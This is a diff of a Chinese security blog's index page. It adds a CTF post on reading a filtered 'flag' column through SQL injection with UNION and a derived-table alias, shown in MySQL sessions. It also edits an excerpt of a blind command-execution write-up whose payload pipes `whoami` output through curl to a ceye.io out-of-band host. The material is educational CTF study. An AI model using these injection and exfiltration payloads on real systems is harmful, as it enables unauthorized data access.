@@ -81,20 +81,28 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2018/03/06/daiker666/" title="daiker666" itemprop="url">daiker666</a>
+      <a href="/2018/03/12/CTF中SQL注入字段名被过滤小技巧/" title="CTF中SQL注入字段名被过滤小技巧" itemprop="url">CTF中SQL注入字段名被过滤小技巧</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="daiker" target="_blank" itemprop="author">daiker</a>
 		
   <p class="article-time">
-    <time datetime="2018-03-06T15:57:13.000Z" itemprop="datePublished"> 发表于 2018-03-06</time>
+    <time datetime="2018-03-12T03:04:07.000Z" itemprop="datePublished"> 发表于 2018-03-12</time>
     
   </p>
 </header>
     <div class="article-content">
         
-        <h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1>
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来</p>
+<h1 id="0x01-问题引入"><a href="#0x01-问题引入" class="headerlink" title="0x01 问题引入"></a>0x01 问题引入</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+--------+-----------+</span><br><span class="line">| points | flag      |</span><br><span class="line">+--------+-----------+</span><br><span class="line">| 31     | daiker666 |</span><br><span class="line">+--------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。</p>
+<h1 id="0x02-问题思考"><a href="#0x02-问题思考" class="headerlink" title="0x02 问题思考"></a>0x02 问题思考</h1><p>常规的查询是<code>select flag from users</code>,如果我要在们的查询语句中不见到<code>flag</code>，就得把<code>flag</code>这个列设置别名，mysql设置列别名有两种方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag as haha from users;</span><br><span class="line">+-----------+</span><br><span class="line">| haha      |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (flag)haha from users;</span><br><span class="line">+-----------+</span><br><span class="line">| haha      |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>但是这样我们还会出现flag这个字段。这时候想到这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1,2;</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">| 1 | 2 |</span><br><span class="line">+---+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>这样列名不久变成我们想要的结果，然而我们想要的结果是users表的内容，我们可以使用联合查询<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2 union select * from users;</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">| 31   | daiker666 |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure></p>
+<p>这样我们想要的值就在表里面，，下面思考下怎么提取出来，查询的结果是一张虚表，我们可以用设置别名的方法给这张表命名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select 1,2 union select * from users)c;</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">+------+-----------+</span><br><span class="line">| 1    | 2         |</span><br><span class="line">| 31   | daiker666 |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.02 sec)</span><br></pre></td></tr></table></figure></p>
+<p>然后提取flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select c.2 from (select 1,2 union select * from users)c limit 1,2;</span><br><span class="line">+-----------+</span><br><span class="line">| 2         |</span><br><span class="line">+-----------+</span><br><span class="line">| daiker666 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.02 sec)</span><br></pre></td></tr></table></figure></p>
+
         
         
         <p class="article-more-link">
@@ -104,6 +112,16 @@
     <footer class="article-footer clearfix">
 <div class="article-catetags">
 
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/注入/">注入</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/CTF/">CTF</a><a href="/tags/注入/">注入</a><a href="/tags/web/">web</a>
+  </div>
 
 </div>
 
@@ -113,7 +131,7 @@
 <div class="comments-count">
 	
 	  	<span></span>
-		<a href="/2018/03/06/daiker666/#comments" class="ds-thread-count comments-count-link" data-thread-key="2018/03/06/daiker666/" data-count-type="comments">&nbsp;</a>
+		<a href="/2018/03/12/CTF中SQL注入字段名被过滤小技巧/#comments" class="ds-thread-count comments-count-link" data-thread-key="2018/03/12/CTF中SQL注入字段名被过滤小技巧/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -147,7 +165,7 @@
     <div class="article-content">
         
         <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过<code>DNS通道/HTTP通道</code>和<code>反弹shell</code>。</p>
-<h1 id="0x01-DNS通道-HTTP通道"><a href="#0x01-DNS通道-HTTP通道" class="headerlink" title="0x01 DNS通道/HTTP通道"></a>0x01 DNS通道/HTTP通道</h1><p>post ip=0.0.0.0|curl <em>*</em>.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>
+<h1 id="0x01-DNS通道-HTTP通道"><a href="#0x01-DNS通道-HTTP通道" class="headerlink" title="0x01 DNS通道/HTTP通道"></a>0x01 DNS通道/HTTP通道</h1><p>post ip=0.0.0.0|curl <em>*</em>.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)<br><img src="http://upload-images.jianshu.io/upload_images/5443560-c408e1c41f14c7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>
         
         
         <p class="article-more-link">
@@ -198,7 +216,7 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/12/22/php-object-injection/" title="php-object-injection" itemprop="url">php-object-injection</a>
+      <a href="/2017/12/22/php反序列化漏洞/" title="php-object-injection" itemprop="url">php-object-injection</a>
   </h1>
   <p class="article-author">By
        
@@ -216,7 +234,7 @@
         
         <p class="article-more-link">
           
-            <a href="/2017/12/22/php-object-injection/#more">Read More</a>
+            <a href="/2017/12/22/php反序列化漏洞/#more">Read More</a>
           
        </p>
     </div>
@@ -242,7 +260,7 @@
 <div class="comments-count">
 	
 	  	<span></span>
-		<a href="/2017/12/22/php-object-injection/#comments" class="ds-thread-count comments-count-link" data-thread-key="2017/12/22/php-object-injection/" data-count-type="comments">&nbsp;</a>
+		<a href="/2017/12/22/php反序列化漏洞/#comments" class="ds-thread-count comments-count-link" data-thread-key="2017/12/22/php反序列化漏洞/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -376,7 +394,7 @@
     <div class="article-content">
         
         <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>我们最常见的注入就是在查询中注入，那你有没有遇到过插入的时候也能注入。插入中最常见的就是注册用户或者撰写文章。当然，注册用户的时候可能会考虑去数据库查询下有没有这个人，这涉及到查询时候的注入，我们今天忽略这种注入。</p>
-<h2 id="0x01-例子"><a href="#0x01-例子" class="headerlink" title="0x01 例子"></a>0x01 例子</h2><p>下面我给出一个简单的例子，基于php+mysql的。方便实验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql语句</span><br><span class="line">create database sqli;</span><br><span class="line">use sqli;</span><br><span class="line">create table user(</span><br><span class="line">name varchar(40),</span><br><span class="line">email  varchar(20),</span><br><span class="line">qq varchar(20)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x01-例子"><a href="#0x01-例子" class="headerlink" title="0x01 例子"></a>0x01 例子</h2><p>下面我给出一个简单的例子，基于php+mysql的。方便实验<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database sqli;</span><br><span class="line">use sqli;</span><br><span class="line">create table user(</span><br><span class="line">name varchar(40),</span><br><span class="line">email  varchar(20),</span><br><span class="line">qq varchar(20)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
         
         
         <p class="article-more-link">
@@ -452,7 +470,7 @@
 		  
 		
 		  
-			<li><a href="/categories/注入/" title="注入">注入<sup>1</sup></a></li>
+			<li><a href="/categories/注入/" title="注入">注入<sup>2</sup></a></li>
 		  
 		
 		  
@@ -481,6 +499,10 @@
 			
 		
 			
+				<li><a href="/tags/注入/" title="注入">注入<sup>2</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/漏洞研究/" title="漏洞研究">漏洞研究<sup>2</sup></a></li>
 			
 		
@@ -489,11 +511,15 @@
 			
 		
 			
-				<li><a href="/tags/注入/" title="注入">注入<sup>1</sup></a></li>
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+				<li><a href="/tags/CTF/" title="CTF">CTF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/提权/" title="提权">提权<sup>1</sup></a></li>
 			
 		
 			
@@ -505,7 +531,7 @@
 			
 		
 			
-				<li><a href="/tags/提权/" title="提权">提权<sup>1</sup></a></li>
+				<li><a href="/tags/web/" title="web">web<sup>1</sup></a></li>
 			
 		
 		</ul>
